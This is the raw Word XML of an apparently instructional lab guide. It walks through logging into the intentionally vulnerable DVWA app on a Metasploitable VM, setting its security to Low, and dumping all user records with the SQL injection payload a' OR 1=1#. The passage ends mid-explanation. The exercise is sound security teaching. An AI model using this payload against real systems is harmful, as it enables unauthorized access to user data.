        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251951104" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="276B0B00" wp14:editId="5091D3BE">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="column">
                  <wp:posOffset>405130</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>943610</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="881380" cy="355600"/>
                <wp:effectExtent l="50800" t="38100" r="45720" b="76200"/>
                <wp:wrapNone/>
                <wp:docPr id="5" name="Straight Arrow Connector 5"/>
                <wp:cNvGraphicFramePr/>
                <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                  <a:graphicData uri="http://schemas.microsoft.com/office/word/2010/wordprocessingShape">
                    <wps:wsp>
                      <wps:cNvCnPr/>
                      <wps:spPr>
                        <a:xfrm flipH="1">
                          <a:off x="0" y="0"/>
                          <a:ext cx="881380" cy="355600"/>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C9E445" id="Straight Arrow Connector 5" o:spid="_x0000_s1026" type="#_x0000_t32" style="position:absolute;margin-left:31.9pt;margin-top:74.3pt;width:69.4pt;height:28pt;flip:x;z-index:25195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" strokecolor="#ca1e17 [3205]" strokeweight="2pt">
                <v:stroke endarrow="block"/>
                <v:shadow on="t" color="black" opacity="24903f" origin=",.5" offset="0,.55556mm"/>
              </v:shape>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r w:rsidRPr="005B2127">
        <w:rPr>
          <w:noProof/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="05750A93" wp14:editId="7623681D">
            <wp:extent cx="4754880" cy="2859882"/>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6">
                      <a:extLst>
                        <a:ext uri="{28A0092B-C50C-407E-A947-70E740481C1C}">
                          <a14:useLocalDpi xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main" val="0"/>
                        </a:ext>
                      </a:extLst>
                    </a:blip>
                    <a:srcRect t="167" r="31899" b="45220"/>
                    <a:stretch/>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="4773410" cy="2871027"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                    <a:extLst>
                      <a:ext uri="{53640926-AAD7-44D8-BBD7-CCE9431645EC}">
                        <a14:shadowObscured xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main"/>
                      </a:ext>
                    </a:extLst>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AAE81F9" w14:textId="0687ECC4" w:rsidR="005B2127" w:rsidRPr="005B6158" w:rsidRDefault="005B2127" w:rsidP="005B2127">
      <w:r w:rsidRPr="005B6158">
        <w:t xml:space="preserve">Use the following command to ensure you can ping the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00EC3737">
        <w:rPr>
          <w:rStyle w:val="QABold"/>
        </w:rPr>
        <w:t>Metasploitable</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00EC3737">
        <w:rPr>
          <w:rStyle w:val="QABold"/>
        </w:rPr>
        <w:t xml:space="preserve"> VM</w:t>
      </w:r>
      <w:r w:rsidRPr="005B6158">
        <w:t xml:space="preserve"> (</w:t>
      </w:r>
      <w:r w:rsidR="009F324B">
        <w:t>192.168.</w:t>
      </w:r>
      <w:r w:rsidR="000756F5">
        <w:t>1</w:t>
      </w:r>
      <w:r w:rsidR="00042EB0">
        <w:t>.99</w:t>
      </w:r>
      <w:r w:rsidRPr="005B6158">
        <w:t xml:space="preserve">) from the </w:t>
      </w:r>
      <w:r w:rsidRPr="00EC3737">
        <w:rPr>
          <w:rStyle w:val="QABold"/>
        </w:rPr>
        <w:t>Kali Linux VM</w:t>
      </w:r>
      <w:r w:rsidRPr="005B6158">
        <w:t xml:space="preserve"> (192.168.</w:t>
      </w:r>
      <w:r w:rsidR="000756F5">
        <w:t>1</w:t>
      </w:r>
      <w:r w:rsidRPr="005B6158">
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="00042EB0">
        <w:t>80</w:t>
      </w:r>
      <w:r w:rsidRPr="005B6158">
        <w:t>) before continuing.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63BCE7E6" w14:textId="6A75B320" w:rsidR="005B2127" w:rsidRPr="005B6158" w:rsidRDefault="005B2127" w:rsidP="005B2127">
      <w:pPr>
        <w:pStyle w:val="QACodeSegment"/>
      </w:pPr>
      <w:r w:rsidRPr="005B6158">
        <w:t>ping 192.168.</w:t>
      </w:r>
      <w:r w:rsidR="000756F5">
        <w:t>1</w:t>
      </w:r>
      <w:r w:rsidRPr="005B6158">
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="00042EB0">
        <w:t>99</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F16F671" w14:textId="52EE7599" w:rsidR="00D94348" w:rsidRDefault="00D94348">
      <w:pPr>
        <w:spacing w:before="0"/>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="21225490" w14:textId="1D4EA7C4" w:rsidR="001F4164" w:rsidRDefault="002906CE" w:rsidP="00AE10C3">
      <w:pPr>
        <w:pStyle w:val="QAHeadingH3MajorSub-heading"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Step 3: Access the DVWA </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>website</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="6D86D547" w14:textId="684FDB59" w:rsidR="002906CE" w:rsidRDefault="00DA02B8" w:rsidP="001F4164">
      <w:r>
        <w:t xml:space="preserve">On the </w:t>
      </w:r>
      <w:r w:rsidRPr="00DA02B8">
        <w:rPr>
          <w:rStyle w:val="QABold"/>
        </w:rPr>
        <w:t>Kali VM</w:t>
      </w:r>
      <w:r>
        <w:t>, l</w:t>
      </w:r>
      <w:r w:rsidR="002906CE">
        <w:t>aunch the Firefox web browser by double clicking on the icon in the left-hand sidebar.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38381C7B" w14:textId="086069A5" w:rsidR="000756F5" w:rsidRDefault="000756F5" w:rsidP="001F4164">
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251953152" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="6D93E5A8" wp14:editId="7F194B08">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="column">
                  <wp:posOffset>214291</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>411762</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="627398" cy="140164"/>
                <wp:effectExtent l="50800" t="50800" r="45720" b="76200"/>
                <wp:wrapNone/>
                <wp:docPr id="11" name="Straight Arrow Connector 11"/>
                <wp:cNvGraphicFramePr/>
                <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                  <a:graphicData uri="http://schemas.microsoft.com/office/word/2010/wordprocessingShape">
                    <wps:wsp>
                      <wps:cNvCnPr/>
                      <wps:spPr>
                        <a:xfrm flipH="1" flipV="1">
                          <a:off x="0" y="0"/>
                          <a:ext cx="627398" cy="140164"/>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08990BA" id="Straight Arrow Connector 11" o:spid="_x0000_s1026" type="#_x0000_t32" style="position:absolute;margin-left:16.85pt;margin-top:32.4pt;width:49.4pt;height:11.05pt;flip:x y;z-index:25195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" strokecolor="#ca1e17 [3205]" strokeweight="2pt">
                <v:stroke endarrow="block"/>
                <v:shadow on="t" color="black" opacity="24903f" origin=",.5" offset="0,.55556mm"/>
              </v:shape>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r w:rsidRPr="000756F5">
        <w:rPr>
          <w:noProof/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="022FB7E0" wp14:editId="4D543A00">
            <wp:extent cx="3797763" cy="254563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804250" cy="2549980"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FC135AC" w14:textId="77777777" w:rsidR="00D937CA" w:rsidRDefault="00D937CA" w:rsidP="001F4164"/>
    <w:p w14:paraId="75C19C9B" w14:textId="77E9CF43" w:rsidR="000756F5" w:rsidRDefault="000756F5" w:rsidP="001F4164">
      <w:r>
        <w:t xml:space="preserve">In Firefox, type the following address in the address bar to navigate to the DVWA's login page (the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="000756F5">
        <w:rPr>
          <w:rStyle w:val="QABold"/>
        </w:rPr>
        <w:t>Metasploitable</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="000756F5">
        <w:rPr>
          <w:rStyle w:val="QABold"/>
        </w:rPr>
        <w:t xml:space="preserve"> VM</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is the web server hosting it, remember).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F63ACC0" w14:textId="44B377C9" w:rsidR="000756F5" w:rsidRDefault="00000000" w:rsidP="000756F5">
      <w:pPr>
        <w:pStyle w:val="QACodeSegment"/>
      </w:pPr>
      <w:hyperlink r:id="rId18" w:history="1">
        <w:r w:rsidR="00D937CA" w:rsidRPr="00266095">
          <w:t>http://192.168.1.99/dvwa</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="15D6CF3C" w14:textId="77777777" w:rsidR="00D937CA" w:rsidRPr="00D937CA" w:rsidRDefault="00D937CA" w:rsidP="00D937CA"/>
    <w:p w14:paraId="3A08B5FF" w14:textId="34C38556" w:rsidR="000756F5" w:rsidRDefault="000756F5" w:rsidP="001F4164">
      <w:r w:rsidRPr="000756F5">
        <w:rPr>
          <w:noProof/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="32E215F8" wp14:editId="1693878A">
            <wp:extent cx="4171533" cy="21370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00745" cy="2152015"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BDF03AA" w14:textId="5402C084" w:rsidR="00D937CA" w:rsidRDefault="00D96803" w:rsidP="001F4164">
      <w:r>
        <w:t xml:space="preserve">Login </w:t>
      </w:r>
      <w:r w:rsidR="00733CE4">
        <w:t xml:space="preserve">to </w:t>
      </w:r>
      <w:r w:rsidR="0021313D">
        <w:t xml:space="preserve">the </w:t>
      </w:r>
      <w:r w:rsidR="00733CE4">
        <w:t>DVWA website using</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> the following credentials:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AF02CBE" w14:textId="77777777" w:rsidR="00CE3EC0" w:rsidRDefault="00CE3EC0" w:rsidP="001F4164"/>
    <w:p w14:paraId="22822EC0" w14:textId="77777777" w:rsidR="00956947" w:rsidRPr="00205AE0" w:rsidRDefault="00956947" w:rsidP="00956947">
      <w:pPr>
        <w:pStyle w:val="QACodeSegment"/>
      </w:pPr>
      <w:r w:rsidRPr="00205AE0">
        <w:t>Username: admin</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77483AFD" w14:textId="77777777" w:rsidR="00956947" w:rsidRPr="00205AE0" w:rsidRDefault="00956947" w:rsidP="00956947">
      <w:pPr>
        <w:pStyle w:val="QACodeSegment"/>
      </w:pPr>
      <w:r w:rsidRPr="00205AE0">
        <w:t>Password: password</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05F947E1" w14:textId="06F8CD5A" w:rsidR="000127F1" w:rsidRDefault="000127F1">
      <w:pPr>
        <w:spacing w:before="0"/>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="11EAA3DB" w14:textId="28F87886" w:rsidR="00D96803" w:rsidRDefault="000127F1" w:rsidP="008268BA">
      <w:pPr>
        <w:pStyle w:val="QAHeadingH3MajorSub-heading"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Step 4: Set DVWA security to "</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>Low"</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="5F347B81" w14:textId="0D7D19BE" w:rsidR="000127F1" w:rsidRDefault="000127F1" w:rsidP="001F4164">
      <w:r>
        <w:t>Since DVWA has been specifically designed to be a vulnerable website, we need to choose the level of security that we would like this testing website to be at. For this exercise we need to have the security set to "Low", otherwise the attack will not work.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1351434D" w14:textId="2F8F9A12" w:rsidR="000127F1" w:rsidRDefault="000127F1" w:rsidP="001F4164"/>
    <w:p w14:paraId="331667C0" w14:textId="10203DA4" w:rsidR="000127F1" w:rsidRDefault="000127F1" w:rsidP="001F4164">
      <w:r>
        <w:t xml:space="preserve">Once logged in, click on the </w:t>
      </w:r>
      <w:r w:rsidR="005C33F9">
        <w:t>"</w:t>
      </w:r>
      <w:r w:rsidRPr="005C33F9">
        <w:rPr>
          <w:rStyle w:val="QABold"/>
        </w:rPr>
        <w:t>DVWA Security</w:t>
      </w:r>
      <w:r w:rsidR="005C33F9">
        <w:t>"</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> button on the left-hand sidebar</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0425A824" w14:textId="0A1AEE75" w:rsidR="000127F1" w:rsidRDefault="000127F1" w:rsidP="001F4164">
      <w:r w:rsidRPr="000127F1">
        <w:rPr>
          <w:noProof/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251955200" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="5EF73234" wp14:editId="19987DB3">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="column">
                  <wp:posOffset>1048639</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>2241791</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="700817" cy="206908"/>
                <wp:effectExtent l="50800" t="38100" r="36195" b="85725"/>
                <wp:wrapNone/>
                <wp:docPr id="14" name="Straight Arrow Connector 14"/>
                <wp:cNvGraphicFramePr/>
                <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                  <a:graphicData uri="http://schemas.microsoft.com/office/word/2010/wordprocessingShape">
                    <wps:wsp>
                      <wps:cNvCnPr/>
                      <wps:spPr>
                        <a:xfrm flipH="1">
                          <a:off x="0" y="0"/>
                          <a:ext cx="700817" cy="206908"/>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C8D1356" id="Straight Arrow Connector 14" o:spid="_x0000_s1026" type="#_x0000_t32" style="position:absolute;margin-left:82.55pt;margin-top:176.5pt;width:55.2pt;height:16.3pt;flip:x;z-index:25195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" strokecolor="#ca1e17 [3205]" strokeweight="2pt">
                <v:stroke endarrow="block"/>
                <v:shadow on="t" color="black" opacity="24903f" origin=",.5" offset="0,.55556mm"/>
              </v:shape>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r w:rsidRPr="000127F1">
        <w:rPr>
          <w:noProof/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="26DABFF1" wp14:editId="1BFAF4A9">
            <wp:extent cx="4919071" cy="274812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932982" cy="2755898"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="463ABB58" w14:textId="1544C2BE" w:rsidR="000127F1" w:rsidRDefault="000127F1" w:rsidP="001F4164"/>
    <w:p w14:paraId="09EFB9AF" w14:textId="60838A53" w:rsidR="000127F1" w:rsidRDefault="000127F1" w:rsidP="001F4164">
      <w:r>
        <w:t>On the next screen choose "</w:t>
      </w:r>
      <w:r w:rsidRPr="000127F1">
        <w:rPr>
          <w:rStyle w:val="QABold"/>
        </w:rPr>
        <w:t>Low</w:t>
      </w:r>
      <w:r>
        <w:t>" in the drop-down menu and click "</w:t>
      </w:r>
      <w:r w:rsidRPr="000127F1">
        <w:rPr>
          <w:rStyle w:val="QABold"/>
        </w:rPr>
        <w:t>Submit</w:t>
      </w:r>
      <w:r>
        <w:t>"</w:t>
      </w:r>
      <w:r w:rsidR="004F0788">
        <w:t xml:space="preserve"> to save the changes.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21A4472C" w14:textId="5E4FFC8E" w:rsidR="000127F1" w:rsidRDefault="000127F1" w:rsidP="001F4164">
      <w:r w:rsidRPr="000127F1">
        <w:rPr>
          <w:noProof/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="3E4908F9" wp14:editId="4DB09986">
            <wp:extent cx="4999165" cy="2792873"/>
            <wp:effectExtent l="0" t="0" r="508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10962" cy="2799464"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D98CDA5" w14:textId="2A1608A9" w:rsidR="0076355D" w:rsidRDefault="0076355D" w:rsidP="001F4164"/>
    <w:p w14:paraId="2A570D71" w14:textId="7F0CE0F5" w:rsidR="0076355D" w:rsidRDefault="0076355D" w:rsidP="0040603F">
      <w:pPr>
        <w:pStyle w:val="QAHeadingH3MajorSub-heading"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Step 5: </w:t>
      </w:r>
      <w:r w:rsidR="00197D57">
        <w:t>Check the website for</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> SQL injection </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="00197D57">
        <w:t>vulnerabilities</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="6AF52F0F" w14:textId="2346D51D" w:rsidR="003635EB" w:rsidRDefault="003635EB" w:rsidP="001F4164">
      <w:r>
        <w:t xml:space="preserve">Click on the SQL Injection button on the left-hand sidebar. You'll be presented with a form asking you to input a User ID in order to instruct the database to query all user records and </w:t>
      </w:r>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>display the details of that specific user. Type in the digit 1 in the form and click "Submit". You'll be presented with the details of User 1.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F6A79F9" w14:textId="5DF68D4B" w:rsidR="0040603F" w:rsidRDefault="00AB0BD6" w:rsidP="001F4164">
      <w:r w:rsidRPr="00AB0BD6">
        <w:rPr>
          <w:noProof/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="782D4F9C" wp14:editId="20E07509">
            <wp:extent cx="4004671" cy="223728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018533" cy="2245025"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="56976AD5" w14:textId="09EA5F80" w:rsidR="00AB0BD6" w:rsidRDefault="00AB0BD6" w:rsidP="001F4164"/>
    <w:p w14:paraId="47642089" w14:textId="36293DB7" w:rsidR="000355BE" w:rsidRDefault="00AB0BD6" w:rsidP="000355BE">
      <w:r>
        <w:t xml:space="preserve">Now, let's try to deliberately input a non-digit value, to check if this value will be sent directly to the database server without being checked </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>whether or not</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> it is valid character. Type in the form a single quote </w:t>
      </w:r>
      <w:r w:rsidR="000355BE">
        <w:t xml:space="preserve">character </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="000355BE">
        <w:t>( '</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="000355BE">
        <w:t xml:space="preserve"> ) and press "Submit". The database throws a syntax error, meaning that the input character has been directly sent to the database, without being checked.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67315D2F" w14:textId="0B202A19" w:rsidR="000355BE" w:rsidRDefault="000355BE" w:rsidP="000355BE">
      <w:r w:rsidRPr="000355BE">
        <w:rPr>
          <w:noProof/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="15EF8390" wp14:editId="67D25552">
            <wp:extent cx="6120765" cy="306705"/>
            <wp:effectExtent l="0" t="0" r="63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20765" cy="306705"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="3219A6C8" w14:textId="37643B6B" w:rsidR="00DC5836" w:rsidRDefault="00DC5836" w:rsidP="00DC5836">
      <w:pPr>
        <w:pStyle w:val="QAHeadingH3MajorSub-heading"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Step 6: Conduct the SQL Injection </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>attack</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="6BFBA57F" w14:textId="4F857DEC" w:rsidR="000355BE" w:rsidRDefault="00197D57" w:rsidP="000355BE">
      <w:r>
        <w:t>Press the</w:t>
      </w:r>
      <w:r w:rsidR="00DC5836">
        <w:t xml:space="preserve"> "Back" button in the browser to go back to the "SQL Injection" form.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F3CB627" w14:textId="6724D3D4" w:rsidR="00566A99" w:rsidRDefault="00566A99" w:rsidP="000355BE"/>
    <w:p w14:paraId="0ADF47CE" w14:textId="70A844CC" w:rsidR="00566A99" w:rsidRDefault="00566A99" w:rsidP="000355BE">
      <w:r>
        <w:t>In the form</w:t>
      </w:r>
      <w:r w:rsidR="00327287">
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> type the following and press "</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>Submit"</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="6C1B06F4" w14:textId="77660130" w:rsidR="00566A99" w:rsidRDefault="00566A99" w:rsidP="00566A99">
      <w:pPr>
        <w:pStyle w:val="QACodeSegment"/>
      </w:pPr>
      <w:r>
        <w:t>a' OR 1=1#</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7767E74F" w14:textId="0920DCB1" w:rsidR="00442F3A" w:rsidRDefault="00D93BD1" w:rsidP="000355BE">
      <w:r>
        <w:t>Suddenly, instead of just one user, the database will return all users from the database.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="020E99BD" w14:textId="35F64669" w:rsidR="00D93BD1" w:rsidRDefault="00D93BD1" w:rsidP="000355BE">
      <w:r w:rsidRPr="00D93BD1">
        <w:rPr>
          <w:noProof/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="43F7E94F" wp14:editId="75FC2F22">
            <wp:extent cx="4485232" cy="2511339"/>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491913" cy="2515080"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B2968F4" w14:textId="03688704" w:rsidR="00442F3A" w:rsidRDefault="00454C8E" w:rsidP="000355BE">
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Notice that we have inserted a second condition</w:t>
      </w:r>
      <w:r w:rsidR="00566A99">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">(1=1) which we know it </w:t>
      </w:r>
      <w:r w:rsidR="00566A99">
        <w:t>will</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> always equate to "TRUE"</w:t>
      </w:r>
      <w:r w:rsidR="00327287">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="00327287">
        <w:t>and also</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="00327287">
        <w:t xml:space="preserve"> the 'a'</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00327287">
        <w:t xml:space="preserve">character, which will force the database to conclude that there are no users having that </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00327287">
        <w:t>UserID</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00327287">
        <w:t xml:space="preserve"> (since each user has a number as ID). This will force the database to evaluate the second condition, and because we know that condition to always be true, it will return all records from the database</w:t>
      </w:r>
      <w:r w:rsidR="00174692">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="259C51B3" w14:textId="5F0701F9" w:rsidR="00DC5836" w:rsidRDefault="00442F3A" w:rsidP="000355BE">
      <w:r>
        <w:t>Let's</w:t>
      </w:r>
      <w:r w:rsidR="00454C8E">
        <w:t xml:space="preserve"> assume that the entire SQL query </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">that will be run when the "Submit" button </w:t>
      </w:r>
      <w:r w:rsidR="00C145DD">
        <w:t>will be</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> pressed is something like</w:t>
      </w:r>
      <w:r w:rsidR="00C145DD">
        <w:t xml:space="preserve"> this:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F76C483" w14:textId="77777777" w:rsidR="00C145DD" w:rsidRPr="0062462C" w:rsidRDefault="00C145DD" w:rsidP="00C145DD">
      <w:pPr>
        <w:rPr>
          <w:rStyle w:val="QABlueWords"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0062462C">
        <w:rPr>
          <w:rStyle w:val="QABlueWords"/>
          <w:noProof/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251957248" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="1A5DB50D" wp14:editId="4BABA510">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="column">
                  <wp:posOffset>2981960</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>-54439</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="1468379" cy="300351"/>
                <wp:effectExtent l="0" t="0" r="17780" b="17780"/>
                <wp:wrapNone/>
                <wp:docPr id="20" name="Text Box 20"/>
                <wp:cNvGraphicFramePr/>
                <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                  <a:graphicData uri="http://schemas.microsoft.com/office/word/2010/wordprocessingShape">
                    <wps:wsp>
                      <wps:cNvSpPr txBox="1"/>
                      <wps:spPr>
                        <a:xfrm>
                          <a:off x="0" y="0"/>
                          <a:ext cx="1468379" cy="300351"/>
                        </a:xfrm>
                        <a:prstGeom prst="rect">
                          <a:avLst/>
                        </a:prstGeom>
                        <a:solidFill>
                          <a:schemeClr val="lt1"/>
                        </a:solidFill>
                        <a:ln w="6350">
                          <a:solidFill>
                            <a:prstClr val="black"/>
                          </a:solidFill>
                        </a:ln>
                      </wps:spPr>
                      <wps:txbx>
                        <w:txbxContent>
